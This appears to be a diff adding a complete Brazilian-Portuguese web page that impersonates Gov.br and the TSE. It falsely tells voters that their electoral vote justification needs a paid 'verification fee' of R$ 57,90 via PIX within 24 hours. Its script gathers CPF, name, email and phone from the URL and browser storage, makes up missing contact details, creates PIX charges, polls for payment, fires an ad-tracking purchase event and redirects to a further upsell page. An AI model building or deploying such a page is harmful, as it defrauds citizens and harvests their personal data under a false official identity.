@@ -1,0 +1,1335 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JUSTIFICATIVA VOTO - Finalização de Inscrição</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --blue-10: #ffffff;
+            --blue-20: #1351B4;
+            --red-10: #E52207;
+            --yellow-10: #FFCD07;
+            --gray-10: #ffffff;
+            --gray-20: #ECEEF1;
+        }
+        body { 
+            font-family: 'Rawline', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: var(--gray-10);
+            min-width: 320px;
+        }
+        .header-top {
+            background: var(--blue-10);
+            padding: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .header-logo img {
+            height: 32px;
+        }
+        .header-logo span {
+            color: rgb(0, 0, 0);
+            font-size: 24px;
+            font-weight: 600;
+            border-left: 1px solid rgba(255,255,255,0.2);
+            padding-left: 16px;
+        }
+        .yellow-bar {
+            height: 4px;
+            background-color: var(--yellow-10);
+            width: 100%;
+        }
+        .breadcrumb {
+            background: white;
+            padding: 16px 24px;
+            border-bottom: 1px solid var(--gray-20);
+            color: var(--blue-20);
+            font-size: 14px;
+        }
+        .breadcrumb i {
+            font-size: 12px;
+            margin: 0 8px;
+        }
+        .main-container {
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 40px 24px;
+        }
+        .card {
+            background: white;
+            border-radius: 8px;
+            border: 1px solid var(--gray-20);
+            padding: 32px;
+            margin-bottom: 24px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+        .card-title {
+            color: var(--blue-20);
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        .alert {
+            background: #FFF3CD;
+            border: 1px solid #FFEEBA;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .alert i {
+            color: #856404;
+            font-size: 24px;
+        }
+        .alert p {
+            color: #856404;
+            font-weight: 600;
+            margin: 0;
+            font-size: 16px;
+        }
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 16px 0;
+            border-bottom: 1px solid var(--gray-20);
+        }
+        .status-item:last-child {
+            border-bottom: none;
+        }
+        .status-item i {
+            font-size: 22px;
+        }
+        .status-item.success i {
+            color: #168821;
+        }
+        .status-item.warning i {
+            color: var(--red-10);
+        }
+        .price-box {
+            background: linear-gradient(135deg, #F5F9FF 0%, #EBF5FF 100%);
+            border: 2px solid #D0E8FF;
+            border-radius: 12px;
+            padding: 32px;
+            text-align: center;
+            margin: 32px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        .price-box::before {
+            content: "URGENTE";
+            position: absolute;
+            top: 15px;
+            right: -30px;
+            background: var(--red-10);
+            color: white;
+            padding: 5px 40px;
+            font-size: 12px;
+            font-weight: 700;
+            transform: rotate(45deg);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+        .price-old {
+            color: #6C757D;
+            text-decoration: line-through;
+            font-size: 18px;
+            font-weight: 500;
+        }
+        .price-new {
+            color: var(--blue-20);
+            font-size: 42px;
+            font-weight: 800;
+            margin: 12px 0;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .price-info {
+            color: #495057;
+            font-size: 16px;
+            font-weight: 500;
+            background: rgba(255,255,255,0.7);
+            padding: 8px 16px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-top: 8px;
+        }
+        .countdown {
+            background: rgba(229, 34, 7, 0.1);
+            border: 1px solid rgba(229, 34, 7, 0.3);
+            border-radius: 8px;
+            padding: 12px;
+            margin: 16px 0;
+            text-align: center;
+            color: var(--red-10);
+            font-weight: 600;
+            font-size: 16px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.8; }
+            50% { opacity: 1; }
+            100% { opacity: 0.8; }
+        }
+        .btn-primary {
+            background: var(--blue-20);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 20px 32px;
+            font-size: 18px;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(19, 81, 180, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-primary:hover {
+            background: #0B3B8E;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(19, 81, 180, 0.4);
+        }
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            margin-top: 32px;
+            color: #6C757D;
+        }
+        .security-badges i {
+            margin-right: 8px;
+        }
+        .warning-list {
+            margin: 24px 0;
+            background: rgba(229, 34, 7, 0.05);
+            border-radius: 8px;
+            padding: 20px;
+        }
+        .warning-list h3 {
+            color: var(--red-10);
+            font-weight: 600;
+            margin-bottom: 16px;
+            font-size: 18px;
+        }
+        .warning-list ul {
+            list-style: none;
+            padding: 0;
+        }
+        .warning-list li {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px 0;
+            color: #495057;
+            border-bottom: 1px dashed rgba(0,0,0,0.1);
+            padding-bottom: 12px;
+            margin-bottom: 12px;
+        }
+        .warning-list li:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+        .warning-list i {
+            color: var(--red-10);
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+        .official-seal {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            background: rgba(19, 81, 180, 0.1);
+            border: 1px solid rgba(19, 81, 180, 0.2);
+            border-radius: 8px;
+            padding: 12px 20px;
+            margin: 24px 0;
+            color: var(--blue-20);
+        }
+        .official-seal i {
+            font-size: 20px;
+        }
+        .official-seal span {
+            font-weight: 600;
+        }
+        .highlight-text {
+            background: linear-gradient(120deg, rgba(255, 205, 7, 0.2) 0%, rgba(255, 205, 7, 0.4) 100%);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-weight: 600;
+        }
+        @media (max-width: 768px) {
+            .header-logo span {
+                font-size: 20px;
+            }
+            .main-container {
+                padding: 24px 16px;
+            }
+            .card {
+                padding: 24px 16px;
+            }
+            .security-badges {
+                flex-direction: column;
+                align-items: center;
+                gap: 16px;
+            }
+            .price-new {
+                font-size: 36px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <style>
+.header-top {
+    display: flex;
+    justify-content: center; /* centraliza horizontal */
+    align-items: center;     /* centraliza vertical */
+    height: 80px;           /* altura do topo (ajuste se quiser) */
+}
+
+.header-logo img {
+    max-height: 200px; /* controla o tamanho da logo */
+}
+</style>
+
+<div class="header-top">
+    <div class="header-logo">
+        <img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/3840px-Gov.br_logo.svg.png?utm_source=pt.wikipedia.org&utm_campaign=index&utm_content=thumbnail" alt="PM-AL - Concurso">
+    </div>
+</div>
+    <div class="yellow-bar"></div>
+
+    <div class="breadcrumb">
+        <span>Início</span>
+        <i class="fas fa-chevron-right"></i>
+        
+        
+        <span>Finalização da Justificava</span>
+    </div>
+
+    <main class="main-container">
+        <div class="card">
+            <h1 class="card-title">FINALIZAÇÃO DA JUSTIFICATIVA</h1>
+            
+            <div class="alert">
+                <i class="fas fa-exclamation-triangle"></i>
+                <p>ATENÇÃO: Última etapa para confirmar sua Justificava</p>
+            </div>
+
+            <div class="status-list">
+                <div class="status-item success">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Identificação do candidato</span>
+                </div>
+                <div class="status-item success">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Verificação de documentos</span>
+                </div>
+                <div class="status-item warning">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span><strong>Validação final pendente</strong></span>
+                </div>
+            </div>
+
+            <div style="margin-top: 32px;">
+                <p style="margin-bottom: 16px; font-size: 16px; line-height: 1.6;">
+                    Sua Justificava está <span class="highlight-text">quase concluída</span>. Para garantir sua vaga e oficializar , é necessário realizar o pagamento da <strong style="color: var(--red-10)">Taxa de Verificação</strong>.
+                </p>
+            </div>
+
+            <div class="warning-list">
+                <h3><i class="fas fa-exclamation-triangle"></i> Informações Importantes:</h3>
+                <ul>
+                    <li>
+                        <i class="fas fa-ban"></i>
+                        <span>A Justificava só será confirmada após a compensação do pagamento</span>
+                    </li>
+                    <li>
+                        <i class="fas fa-file-invoice"></i>
+                        <span>O não pagamento resultará no cancelamento automático da Justificava</span>
+                    </li>
+                    <li>
+                        <i class="fas fa-user-lock"></i>
+                        <span>Mantenha o comprovante de pagamento para eventuais consultas</span>
+                    </li>
+                    <li>
+                        <i class="fas fa-exclamation-circle"></i>
+                        <span>A confirmação da Justificava de voto será enviada ao seu e-mail após o pagamento</span>
+                    </li>
+                </ul>
+            </div>
+
+            <div class="countdown">
+                <i class="fas fa-clock"></i> Prazo para pagamento: 24 horas
+            </div>
+
+            <div class="price-box">
+                <div class="price-new">R$ 57,90</div>
+            </div>
+
+            <div class="official-seal">
+                <i class="fas fa-shield-alt"></i>
+                <span>Portal do Candidato</span>
+            </div>
+
+            
+
+
+<a
+    href="#"
+    id="btn-up1-pix"
+    class="btn-primary pulse-animation"
+    style="display:inline-block;text-decoration:none;text-align:center;"
+>
+    <i class="fas fa-check-circle"></i> CONCLUIR JUSTIFICATIVA
+</a>
+            <div style="text-align: center; margin-top: 16px; color: #6C757D; font-size: 14px;">
+                <i class="fas fa-lock"></i> Transação segura e protegida
+            </div>
+        </div>
+
+        <div class="security-badges">
+            <div>
+                <i class="fas fa-lock"></i>
+                Conexão Segura
+            </div>
+            <div>
+                <i class="fas fa-shield-alt"></i>
+                Dados Protegidos
+            </div>
+            <div>
+                <i class="fas fa-check-circle"></i>
+                TSE
+            </div>
+        </div>
+    </main>
+
+    <script>
+        function checkout(event) {
+            if (event) event.preventDefault();
+        }
+    </script>
+    
+    
+    <style>
+    body.up1-modal-open {
+        overflow: hidden;
+    }
+
+    #up1-pix-modal,
+    #up1-pix-modal * {
+        box-sizing: border-box;
+    }
+
+    #up1-pix-modal {
+        position: fixed;
+        inset: 0;
+        z-index: 999999;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        padding: 16px;
+        background: rgba(0, 0, 0, 0.72);
+        backdrop-filter: blur(4px);
+        -webkit-backdrop-filter: blur(4px);
+    }
+
+    #up1-pix-modal.up1-is-open {
+        display: flex;
+    }
+
+    .up1-modal-card {
+        position: relative;
+        width: 100%;
+        max-width: 440px;
+        max-height: calc(100vh - 32px);
+        overflow-y: auto;
+        padding: 26px 22px;
+        border-radius: 20px;
+        background: #ffffff;
+        color: #202124;
+        text-align: center;
+        font-family: Arial, Helvetica, sans-serif;
+        box-shadow: 0 24px 70px rgba(0, 0, 0, 0.32);
+    }
+
+    .up1-modal-close {
+        position: absolute;
+        top: 10px;
+        right: 12px;
+        width: 38px;
+        height: 38px;
+        padding: 0;
+        border: 0;
+        border-radius: 50%;
+        background: #f1f3f5;
+        color: #333333;
+        font-size: 26px;
+        line-height: 38px;
+        cursor: pointer;
+    }
+
+    .up1-pix-icon {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 62px;
+        height: 62px;
+        margin: 0 auto 12px;
+        border-radius: 50%;
+        background: #e7fff8;
+        color: #1351b4;
+        font-size: 30px;
+        font-weight: 700;
+    }
+
+    .up1-modal-title {
+        margin: 0 35px 6px;
+        color: #151515;
+        font-size: 23px;
+        line-height: 1.2;
+    }
+
+    .up1-modal-subtitle {
+        margin: 0 0 18px;
+        color: #666666;
+        font-size: 14px;
+        line-height: 1.5;
+    }
+
+    .up1-price {
+        margin-bottom: 16px;
+        color: #111111;
+        font-size: 30px;
+        font-weight: 800;
+    }
+
+    .up1-loading-spinner {
+        width: 48px;
+        height: 48px;
+        margin: 28px auto 16px;
+        border: 5px solid #e3e3e3;
+        border-top-color: #1351b4;
+        border-radius: 50%;
+        animation: up1Spin 0.8s linear infinite;
+    }
+
+    @keyframes up1Spin {
+        to {
+            transform: rotate(360deg);
+        }
+    }
+
+    #up1-qr-holder {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 250px;
+        min-height: 250px;
+        margin: 0 auto 14px;
+        padding: 10px;
+        border: 1px solid #e5e5e5;
+        border-radius: 14px;
+        background: #ffffff;
+    }
+
+    #up1-qr-holder img,
+    #up1-qr-holder canvas {
+        display: block;
+        width: 230px !important;
+        height: 230px !important;
+        max-width: 100%;
+        object-fit: contain;
+    }
+
+    .up1-status {
+        display: inline-flex;
+        align-items: center;
+        gap: 7px;
+        margin-bottom: 15px;
+        padding: 7px 12px;
+        border-radius: 999px;
+        background: #fff7db;
+        color: #7a5700;
+        font-size: 13px;
+        font-weight: 700;
+    }
+
+    .up1-status-dot {
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        background: #f5ad00;
+        animation: up1Pulse 1.2s infinite;
+    }
+
+    @keyframes up1Pulse {
+        50% {
+            opacity: 0.35;
+        }
+    }
+
+    .up1-copy-code {
+        width: 100%;
+        min-height: 76px;
+        padding: 11px;
+        resize: none;
+        border: 1px solid #dddddd;
+        border-radius: 10px;
+        background: #f7f7f7;
+        color: #444444;
+        font-family: monospace;
+        font-size: 11px;
+        line-height: 1.35;
+        word-break: break-all;
+    }
+
+    .up1-copy-button,
+    .up1-retry-button {
+        width: 100%;
+        margin-top: 10px;
+        padding: 15px 18px;
+        border: 0;
+        border-radius: 10px;
+        background: #1351b4;
+        color: #ffffff;
+        font-size: 16px;
+        font-weight: 800;
+        cursor: pointer;
+    }
+
+    .up1-copy-button:hover,
+    .up1-retry-button:hover {
+        filter: brightness(0.94);
+    }
+
+    .up1-instruction {
+        margin: 13px 0 0;
+        color: #666666;
+        font-size: 13px;
+        line-height: 1.45;
+    }
+
+    .up1-error-message {
+        margin: 20px 0 5px;
+        padding: 14px;
+        border-radius: 10px;
+        background: #fff0f0;
+        color: #b42318;
+        font-size: 14px;
+        line-height: 1.45;
+    }
+
+    .up1-success-icon {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 78px;
+        height: 78px;
+        margin: 22px auto 15px;
+        border-radius: 50%;
+        background: #e8fff5;
+        color: #1351b4;
+        font-size: 42px;
+        font-weight: 800;
+    }
+
+    .up1-success-title {
+        margin: 0 0 8px;
+        color: #101828;
+        font-size: 25px;
+    }
+
+    .up1-success-text {
+        margin: 0 0 10px;
+        color: #667085;
+        font-size: 15px;
+        line-height: 1.5;
+    }
+
+    .up1-hidden {
+        display: none !important;
+    }
+
+    @media (max-width: 480px) {
+        .up1-modal-card {
+            padding: 24px 16px;
+            border-radius: 16px;
+        }
+
+        #up1-qr-holder {
+            width: 230px;
+            min-height: 230px;
+        }
+
+        #up1-qr-holder img,
+        #up1-qr-holder canvas {
+            width: 210px !important;
+            height: 210px !important;
+        }
+    }
+</style>
+
+<div id="up1-pix-modal" aria-hidden="true">
+    <div
+        class="up1-modal-card"
+        role="dialog"
+        aria-modal="true"
+        aria-labelledby="up1-modal-title"
+    >
+        <button
+            type="button"
+            id="up1-modal-close"
+            class="up1-modal-close"
+            aria-label="Fechar"
+        >
+            &times;
+        </button>
+
+        
+
+        <h2 id="up1-modal-title" class="up1-modal-title">
+            Finalize seu pagamento
+        </h2>
+
+        <p class="up1-modal-subtitle">
+            Escaneie o QR Code ou copie o código PIX abaixo
+        </p>
+
+        <div class="up1-price">R$ 57,90</div>
+
+        <div id="up1-loading-view">
+            <div class="up1-loading-spinner"></div>
+            <p>Gerando seu PIX com segurança...</p>
+        </div>
+
+        <div id="up1-payment-view" class="up1-hidden">
+            <div class="up1-status">
+                <span class="up1-status-dot"></span>
+                Aguardando pagamento
+            </div>
+
+            <div id="up1-qr-holder"></div>
+
+            <textarea
+                id="up1-copy-code"
+                class="up1-copy-code"
+                readonly
+                aria-label="Código PIX copia e cola"
+            ></textarea>
+
+            <button
+                type="button"
+                id="up1-copy-button"
+                class="up1-copy-button"
+            >
+                Copiar código PIX
+            </button>
+
+            <p class="up1-instruction">
+                Abra o aplicativo do seu banco, escolha pagar com PIX e
+                escaneie o QR Code ou utilize a opção “PIX copia e cola”.
+            </p>
+        </div>
+
+        <div id="up1-error-view" class="up1-hidden">
+            <div id="up1-error-message" class="up1-error-message"></div>
+
+            <button
+                type="button"
+                id="up1-retry-button"
+                class="up1-retry-button"
+            >
+                Tentar novamente
+            </button>
+        </div>
+
+        <div id="up1-success-view" class="up1-hidden">
+            <div class="up1-success-icon">✓</div>
+
+            <h3 class="up1-success-title">
+                Pagamento aprovado!
+            </h3>
+
+            <p class="up1-success-text">
+                Seu pagamento do UP1 foi confirmado com sucesso.
+            </p>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+<script>
+(function () {
+    'use strict';
+
+    var UP1_AMOUNT_CENTS = 5790;
+    var UP1_PAYMENT_URL = '../pagamento-upsell.php';
+    var UP1_VERIFY_URL = '../checkout/verificar.php';
+    
+    function goToUp2() {
+    try {
+        var savedData = readStorage(
+            sessionStorage,
+            'desenrola.pagamento'
+        );
+
+        sessionStorage.setItem(
+            'desenrola.pagamento',
+            JSON.stringify(
+                Object.assign(savedData, getCustomerData())
+            )
+        );
+    } catch (error) {
+        // Continua mesmo se o navegador bloquear o storage.
+    }
+
+    var destination = new URL('../up2/', window.location.href);
+    destination.search = window.location.search;
+
+    window.setTimeout(function () {
+        window.location.href = destination.href;
+    }, 1200);
+}
+
+    var paymentCode = '';
+    var pixCode = '';
+    var qrCodeUrl = '';
+    var pollingTimer = null;
+    var paymentApproved = false;
+    var generatingPayment = false;
+
+    var openButton = document.getElementById('btn-up1-pix');
+    var modal = document.getElementById('up1-pix-modal');
+    var closeButton = document.getElementById('up1-modal-close');
+
+    var loadingView = document.getElementById('up1-loading-view');
+    var paymentView = document.getElementById('up1-payment-view');
+    var errorView = document.getElementById('up1-error-view');
+    var successView = document.getElementById('up1-success-view');
+
+    var errorMessage = document.getElementById('up1-error-message');
+    var qrHolder = document.getElementById('up1-qr-holder');
+    var copyCodeField = document.getElementById('up1-copy-code');
+    var copyButton = document.getElementById('up1-copy-button');
+    var retryButton = document.getElementById('up1-retry-button');
+
+    function readStorage(storage, key) {
+        try {
+            var value = JSON.parse(storage.getItem(key) || '{}');
+
+            if (typeof value === 'string') {
+                value = JSON.parse(value || '{}');
+            }
+
+            return value && typeof value === 'object' ? value : {};
+        } catch (error) {
+            return {};
+        }
+    }
+
+    function onlyDigits(value) {
+        return String(value || '').replace(/\D/g, '');
+    }
+
+    function randomPhone() {
+        var ddds = [
+            '11', '21', '31', '41', '51', '61',
+            '71', '81', '85', '19', '27', '47',
+            '48', '62', '98'
+        ];
+
+        var ddd = ddds[Math.floor(Math.random() * ddds.length)];
+        var number = '9';
+
+        for (var i = 0; i < 8; i++) {
+            number += Math.floor(Math.random() * 10);
+        }
+
+        return ddd + number;
+    }
+
+    function getCustomerData() {
+        var query = new URLSearchParams(window.location.search);
+        var sessionData = readStorage(
+            sessionStorage,
+            'desenrola.pagamento'
+        );
+        var localData = readStorage(
+            localStorage,
+            'cdt_esa'
+        );
+
+        var cpf = query.get('cpf')
+            || sessionData.cpf
+            || localData.CPF
+            || localData.cpf
+            || localStorage.getItem('cd_esa')
+            || '';
+
+        var nome = query.get('nome')
+            || query.get('name')
+            || sessionData.nome
+            || sessionData.name
+            || localData.NOME
+            || localData.nome
+            || localData.name
+            || 'Cliente';
+
+        var email = query.get('email')
+            || sessionData.email
+            || localData.EMAIL
+            || localData.email
+            || '';
+
+        var telefone = query.get('telefone')
+            || query.get('phone')
+            || sessionData.telefone
+            || sessionData.phone
+            || localData.TELEFONE
+            || localData.telefone
+            || localData.phone
+            || '';
+
+        var cpfDigits = onlyDigits(cpf);
+
+        if (!email || email.indexOf('@') === -1) {
+            email = 'cliente'
+                + (cpfDigits ? '+' + cpfDigits.slice(-6) : '')
+                + '@email.com';
+        }
+
+        if (!onlyDigits(telefone)) {
+            telefone = randomPhone();
+        }
+
+        var payload = {
+            nome: nome,
+            email: email,
+            cpf: cpf,
+            telefone: telefone,
+            valor: UP1_AMOUNT_CENTS
+        };
+
+        [
+            'utm_source',
+            'utm_medium',
+            'utm_campaign',
+            'utm_content',
+            'utm_term',
+            'utm_id',
+            'xcod',
+            'sck',
+            'src',
+            'fbclid'
+        ].forEach(function (field) {
+            var value = query.get(field)
+                || sessionData[field]
+                || '';
+
+            if (value) {
+                payload[field] = value;
+            }
+        });
+
+        return payload;
+    }
+
+    function hideAllViews() {
+        loadingView.classList.add('up1-hidden');
+        paymentView.classList.add('up1-hidden');
+        errorView.classList.add('up1-hidden');
+        successView.classList.add('up1-hidden');
+    }
+
+    function showLoading() {
+        hideAllViews();
+        loadingView.classList.remove('up1-hidden');
+    }
+
+    function showPayment() {
+        hideAllViews();
+        paymentView.classList.remove('up1-hidden');
+    }
+
+    function showError(message) {
+        hideAllViews();
+        errorMessage.textContent = message
+            || 'Não foi possível gerar o pagamento.';
+        errorView.classList.remove('up1-hidden');
+    }
+
+    function showSuccess() {
+        hideAllViews();
+        successView.classList.remove('up1-hidden');
+    }
+
+    function openModal() {
+        modal.classList.add('up1-is-open');
+        modal.setAttribute('aria-hidden', 'false');
+        document.body.classList.add('up1-modal-open');
+    }
+
+    function closeModal() {
+        modal.classList.remove('up1-is-open');
+        modal.setAttribute('aria-hidden', 'true');
+        document.body.classList.remove('up1-modal-open');
+    }
+
+    function renderQrCode(code, imageUrl) {
+        qrHolder.innerHTML = '';
+
+        if (imageUrl) {
+            var image = document.createElement('img');
+            image.src = imageUrl;
+            image.alt = 'QR Code PIX';
+
+            image.onerror = function () {
+                renderQrWithLibrary(code);
+            };
+
+            qrHolder.appendChild(image);
+            return;
+        }
+
+        renderQrWithLibrary(code);
+    }
+
+    function renderQrWithLibrary(code) {
+        qrHolder.innerHTML = '';
+
+        try {
+            if (typeof QRCode !== 'function') {
+                throw new Error('Biblioteca QR Code indisponível.');
+            }
+
+            new QRCode(qrHolder, {
+                text: code,
+                width: 230,
+                height: 230,
+                colorDark: '#000000',
+                colorLight: '#ffffff',
+                correctLevel: QRCode.CorrectLevel.M
+            });
+        } catch (error) {
+            // Uma falha na imagem não invalida o PIX já criado.
+            qrHolder.innerHTML = '';
+            var message = document.createElement('p');
+            message.textContent =
+                'QR Code indisponível. Use o PIX copia e cola abaixo.';
+            message.style.cssText =
+                'text-align:center;font-size:14px;padding:16px;';
+            qrHolder.appendChild(message);
+            console.error('[UP1] Erro ao montar o QR Code:', error);
+        }
+    }
+
+    function savePayment() {
+        try {
+            sessionStorage.setItem(
+                'desenrola.up1',
+                JSON.stringify({
+                    paymentCode: paymentCode,
+                    pixCode: pixCode,
+                    qrCodeUrl: qrCodeUrl,
+                    approved: paymentApproved
+                })
+            );
+        } catch (error) {
+            // O fluxo continua mesmo se o navegador bloquear o storage.
+        }
+    }
+
+    function restorePayment() {
+        var saved = readStorage(
+            sessionStorage,
+            'desenrola.up1'
+        );
+
+        if (!saved.paymentCode) {
+            return false;
+        }
+
+        paymentCode = saved.paymentCode;
+        pixCode = saved.pixCode || '';
+        qrCodeUrl = saved.qrCodeUrl || '';
+        paymentApproved = saved.approved === true;
+
+        if (paymentApproved) {
+    showSuccess();
+    goToUp2();
+    return true;
+}
+
+        if (!pixCode) {
+            return false;
+        }
+
+        copyCodeField.value = pixCode;
+        renderQrCode(pixCode, qrCodeUrl);
+        showPayment();
+        startPolling();
+
+        return true;
+    }
+
+    async function generatePayment() {
+        if (generatingPayment) return;
+        if (paymentCode && pixCode && restorePayment()) return;
+        generatingPayment = true;
+        showLoading();
+
+        try {
+            var response = await fetch(UP1_PAYMENT_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(getCustomerData())
+            });
+
+            var result = await response.json().catch(function () {
+                return {};
+            });
+
+            if (!response.ok || !result.success) {
+                throw new Error(
+                    result.message
+                    || 'Não foi possível gerar o PIX.'
+                );
+            }
+
+            paymentCode = result.paymentCode || result.token || '';
+            pixCode = result.pixCopiaECola || result.pixCode || '';
+            qrCodeUrl = result.qrCodeUrl || '';
+
+            if (!paymentCode || !pixCode) {
+                throw new Error(
+                    'O servidor não retornou o PIX completo.'
+                );
+            }
+
+            paymentApproved = false;
+            copyCodeField.value = pixCode;
+
+            // Salva a cobrança antes de montar a imagem.
+            savePayment();
+            renderQrCode(pixCode, qrCodeUrl);
+            showPayment();
+            startPolling();
+        } catch (error) {
+            paymentCode = '';
+            pixCode = '';
+            qrCodeUrl = '';
+
+            showError(
+                error && error.message
+                    ? error.message
+                    : 'Falha de conexão. Tente novamente.'
+            );
+        } finally {
+            generatingPayment = false;
+        }
+    }
+
+    async function verifyPayment() {
+        if (!paymentCode || paymentApproved) {
+            return;
+        }
+
+        try {
+            var response = await fetch(
+                UP1_VERIFY_URL
+                + '?id='
+                + encodeURIComponent(paymentCode),
+                {
+                    method: 'GET',
+                    cache: 'no-store'
+                }
+            );
+
+            if (!response.ok) {
+                return;
+            }
+
+            var result = await response.json();
+
+            if (!result.success) {
+                return;
+            }
+
+            var status = String(
+                result.status || ''
+            ).toLowerCase();
+
+            if (
+                status === 'paid'
+                || status === 'approved'
+                || status === 'completed'
+                || status === 'complete'
+            ) {
+                paymentApproved = true;
+                stopPolling();
+                savePayment();
+                showSuccess();
+
+                if (openButton) {
+                    openButton.innerHTML =
+                        '<i class="fas fa-check-circle"></i> '
+                        + 'PAGAMENTO APROVADO';
+                    openButton.classList.remove('pulse-animation');
+                }
+
+                try {
+                    if (typeof fbq === 'function') {
+                        fbq(
+                            'track',
+                            'Purchase',
+                            {
+                                value: 57.90,
+                                currency: 'BRL',
+                                content_name: 'up1'
+                            },
+                            {
+                                eventID: 'purchase_up1_' + paymentCode
+                            }
+                        );
+                    }
+                } catch (pixelError) {
+                    console.error(
+                        '[UP1] Erro ao marcar Purchase:',
+                        pixelError
+                    );
+                }
+
+                goToUp2();
+            }
+        } catch (error) {
+            console.error(
+                '[UP1] Erro ao consultar pagamento:',
+                error
+            );
+        }
+    }
+
+    function startPolling() {
+        stopPolling();
+        verifyPayment();
+
+        pollingTimer = window.setInterval(
+            verifyPayment,
+            2000
+        );
+    }
+
+    function stopPolling() {
+        if (pollingTimer) {
+            window.clearInterval(pollingTimer);
+            pollingTimer = null;
+        }
+    }
+
+    function fallbackCopy(text) {
+        var temporary = document.createElement('textarea');
+        temporary.value = text;
+        temporary.style.position = 'fixed';
+        temporary.style.left = '-9999px';
+
+        document.body.appendChild(temporary);
+        temporary.select();
+
+        try {
+            document.execCommand('copy');
+        } catch (error) {
+            console.error('Não foi possível copiar:', error);
+        }
+
+        temporary.remove();
+    }
+
+    function markCopied() {
+        var oldText = copyButton.textContent;
+        copyButton.textContent = '✓ Código PIX copiado!';
+
+        window.setTimeout(function () {
+            copyButton.textContent = oldText;
+        }, 2500);
+    }
+
+    function copyPixCode() {
+        var code = copyCodeField.value || pixCode;
+
+        if (!code) {
+            return;
+        }
+
+        if (
+            navigator.clipboard
+            && navigator.clipboard.writeText
+        ) {
+            navigator.clipboard.writeText(code)
+                .then(markCopied)
+                .catch(function () {
+                    fallbackCopy(code);
+                    markCopied();
+                });
+
+            return;
+        }
+
+        fallbackCopy(code);
+        markCopied();
+    }
+
+    if (openButton) {
+        openButton.addEventListener('click', function (event) {
+            event.preventDefault();
+            openModal();
+
+            if (!restorePayment()) {
+                generatePayment();
+            }
+        });
+    }
+
+    closeButton.addEventListener('click', closeModal);
+    copyButton.addEventListener('click', copyPixCode);
+    retryButton.addEventListener('click', generatePayment);
+
+    modal.addEventListener('click', function (event) {
+        if (event.target === modal) {
+            closeModal();
+        }
+    });
+
+    document.addEventListener('keydown', function (event) {
+        if (event.key === 'Escape') {
+            closeModal();
+        }
+    });
+
+    window.addEventListener('beforeunload', stopPolling);
+})();
+</script>
+
+</body>
+</html>
